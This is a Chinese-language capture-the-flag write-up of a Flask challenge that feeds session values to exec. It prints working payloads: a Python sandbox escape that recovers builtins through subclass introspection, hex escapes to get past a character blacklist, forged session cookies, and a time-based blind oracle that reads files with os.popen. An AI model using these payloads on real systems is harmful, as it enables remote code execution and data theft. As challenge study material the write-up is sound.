## 分析

从`html`源码中可以看到`debug`路径，从而得到源码

```python
def calc(recipe):
    global garage
    builtins, garage = {'__builtins__': None}, {}       # exec 的默认__builtins__ 设置为空
    try: exec(recipe, builtins, garage)
    except: pass

def GFW(func): # Great Firewall of the observable universe and it's infinite timelines
    @functools.wraps(func)
    def federation(*args, **kwargs):
        ingredient = session.get('ingredient', None)
        measurements = session.get('measurements', None)

        recipe = '%s = %s' % (ingredient, measurements)
        if ingredient and measurements and len(recipe) >= 20:
            regex = re.compile('|'.join(map(re.escape, ['[', '(', '_', '.'])))      # 过滤 [ ( _ . 四个字符
            matches = regex.findall(recipe)
            
            if matches:
                return render_template('index.html', blacklisted='Morty you dumbass: ' + ', '.join(set(matches)))
            
            if len(recipe) > 300: 
                return func(*args, **kwargs) # ionic defibulizer can't handle more bytes than that
            
            calc(recipe)    # 然后把字符传入calc函数
            # return render_template('index.html', calculations=garage[ingredient])
            return func(*args, **kwargs) # rick deterrent

        ingredient = session['ingredient'] = ''.join(random.choice(string.lowercase) for _ in xrange(10))
        measurements = session['measurements'] = ''.join(map(str, [random.randint(1, 69), random.choice(['+', '-', '*']), random.randint(1,69)]))

        calc('%s = %s' % (ingredient, measurements))
        return render_template('index.html', calculations=garage[ingredient])
    return federation
```

从上面的代码可以分析得到，会获取`session`的值然后交给`exec`来执行

因为`exec`的内置`__builtins__`设置为空了，首先我们需要的就是恢复`__builtins__`

```python
__builtins__ = [t for t in ().__class__.__bases__[0].__subclasses__() if 'warning' in t.__name__][0]()._module.__builtins__     # python2
__builtins__ = [t for t in ().__class__.__base__.__subclasses__() if t.__name__ == 'Sized'][0].__len__.__globals__['__builtins__']  # python3
```

接着就是要绕过正则表达式，在`python`中`\x12`这样的`16`进制可以表示字符，所以我们只需要对过滤的字符进行替换即可，同时需要注意`\n`也要进行替换，这样在内部的`exec`中才能够正确识别

```python
payload = payload.replace('(', r'\x28').replace('[', r'\x5b').replace('.', r'\x2e').replace('_', r'\x5f').replace('\n', r'\n')

>>> s = "[(_."
>>> s = s.replace('(', r'\x28').replace('[', r'\x5b').replace('.', r'\x2e').replace('_', r'\x5f').replace('\n', r'\n')
>>> s
'\\x5b\\x28\\x5f\\x2e'
>>> exec "print('\\x5b\\x28\\x5f\\x2e')"
[(_.
```

本来打算覆盖`garage[ingredient]`变量来输出结果，但是没能成功，不过可以通过`time.sleep()`函数来执行类似盲注一样的操作

构造`session`的代码如下

```python
sess['ingredient'] = "a"
sess['measurements'] = "1\n%s" % cmd
cmd = "payload"
recipe = sess['ingredient'] + " = " + sess['measurements']
cookie = flask_unsign.sign(sess, secret)    # 使用 flask_unsign 来生成 flask session

```
下面只对`cmd`部分进行修改

1\. 首先获取当前目录下的文件数量

```python
cmd = '''exec "i=().__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']
if i('os').listdir('.').__len__()==%d: i('time').sleep(4)"''' % num

# 3
```

2\. 然后获取每个文件名的长度

```python
cmd = '''exec "i=().__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']
if i('os').listdir('.')[%d].__len__()==%d: i('time').sleep(4)"''' % (i, num)

# 6, 34, 9
```

3\. 获取每个文件的文件名，这里只读取了长度为`34`的文件名

```python
cmd = '''exec "i=().__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']
if i('os').listdir('.')[1][%d]=='%s': i('time').sleep(4)"''' % (i, s)

# totally_******************_flaaaaag
```

4\. 获取该文件内容的长度

```python
cmd = '''exec "i=().__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']
if i('os').popen('cat to*').read().__len__()==%d: i('time').sleep(4)"''' % num

# 51
```

5\. 获取文件内容
```python
cmd = '''exec "i=().__class__.__base__.__subclasses__()[59]()._module.__builtins__['__import__']
if i('os').popen('cat to*').read()[%d]=='%s': i('time').sleep(4)"''' % (i, s)

# HTB{d1d_y0u_****************_m4tt3r?!}
```


## 参考文档

[https://stackoverflow.com/questions/13307110/can-you-recover-from-reassigning-builtins-in-python#13307417](https://stackoverflow.com/questions/13307110/can-you-recover-from-reassigning-builtins-in-python#13307417)

[https://www.freebuf.com/articles/web/246997.html](https://www.freebuf.com/articles/web/246997.html)